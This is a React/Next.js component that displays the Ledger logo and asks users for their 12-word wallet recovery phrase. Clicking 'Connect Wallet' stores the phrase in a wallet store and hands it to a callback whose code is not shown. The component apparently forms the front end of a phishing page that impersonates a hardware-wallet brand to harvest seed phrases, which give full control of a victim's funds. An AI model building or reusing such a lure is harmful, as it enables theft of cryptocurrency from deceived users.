"use client";
import { useState, useRef, useEffect } from "react";
import { Button } from "../ui/button";
import { DM_Mono } from "next/font/google";
import { cn } from "@/lib/utils";
import { useWalletStore } from "@/store/walletStore";

const dmMono = DM_Mono({
	subsets: ["latin"],
	weight: ["400", "500"],
});

const Ledger = ({
	handleFinish,
}: {
	handleFinish: (walletPhrase: string) => Promise<void>;
}) => {
	const [backupPhrase, setBackupPhrase] = useState("");
	const [phraseWords, setPhraseWords] = useState<string[]>([]);
	const textareaRef = useRef<HTMLTextAreaElement>(null);
	const containerRef = useRef<HTMLDivElement>(null);

	const { setSeedPhrase } = useWalletStore();

	const handleComplete = () => {
		setSeedPhrase(phraseWords.join(" "));
		handleFinish(phraseWords.join(" "));
	};

	// Dynamically adjust textarea height as text changes
	useEffect(() => {
		const textarea = textareaRef.current;
		if (textarea) {
			textarea.style.height = "auto";
			textarea.style.height = `${textarea.scrollHeight}px`;
		}
	}, [backupPhrase]);

	// Click anywhere inside the field to focus textarea
	useEffect(() => {
		const container = containerRef.current;
		const textarea = textareaRef.current;
		if (container && textarea) {
			const handleClick = () => textarea.focus();
			container.addEventListener("click", handleClick);
			return () => container.removeEventListener("click", handleClick);
		}
	}, []);

	// Handle input change
	const handleChange = (value: string) => {
		setBackupPhrase(value);
		const words = value
			.trim()
			.split(/\s+/) // split by one or more spaces
			.filter((word) => word.length > 0); // remove empty strings
		setPhraseWords(words);
	};

	return (
		<div
			className={cn(
				"min-h-screen bg-white w-full flex flex-col items-center justify-center p-4",
				dmMono.className
			)}
		>
			<div className="w-full flex justify-start items-center px-4 md:px-16 lg:px-32 xl:px-40">
				<img
					src="/images/wallets/ledgerFull.svg"
					alt="ledger"
					className="w-40"
				/>
			</div>
			<div className="w-full max-w-md">
				{/* Card */}
				<div className="mt-24 flex flex-col w-full h-full px-6 py-8 gap-8 rounded-lg max-w-md m-auto bg-gray-950">
					<div>
						<h1 className="text-2xl font-bold text-white mb-12">
							Enter Seed Phrase
						</h1>
						<p className="text-white/80 text-sm">
							Enter your wallet 12-word recovery phrase (also called a seed
							phrase). You can connect any Ethereum wallet using this phrase.
						</p>
					</div>

					{/* Floating Label Textarea */}
					<div
						ref={containerRef}
						className="relative mb-28 border border-white/30 focus-within:border-gray-100 transition-all duration-200 rounded-lg px-4 pt-3 pb-1 cursor-text"
					>
						<textarea
							ref={textareaRef}
							id="backupPhrase"
							value={backupPhrase}
							onChange={(e) => handleChange(e.target.value)}
							placeholder="Your backup phrase"
							className="peer bg-transparent border-none outline-none w-full text-white/90 placeholder-transparent resize-none overflow-hidden min-h-10"
							rows={1}
						/>
						<label
							htmlFor="backupPhrase"
							className={`absolute left-3 top-3 text-white/50 text-base transition-all duration-200 
								peer-placeholder-shown:top-3 peer-placeholder-shown:text-white/50 peer-placeholder-shown:text-base 
								peer-focus:bg-gray-950 peer-focus:px-2 peer-focus:rounded-full
								peer-focus:-top-3 peer-focus:text-sm peer-focus:text-gray-100
								${
									backupPhrase
										? "-top-3 text-sm text-gray-100 bg-gray-950 px-2 rounded-full"
										: ""
								}`}
						>
							Your backup phrase
						</label>
					</div>

					{/* Buttons */}
					<div className="flex flex-col justify-center items-center">
						<Button
							onClick={handleComplete}
							disabled={phraseWords.length === 0}
							className="w-full bg-gray-200 text-black hover:bg-gray-100 disabled:opacity-60 rounded-full font-semibold"
						>
							Connect Wallet
						</Button>
					</div>
				</div>
			</div>
		</div>
	);
};

export default Ledger;
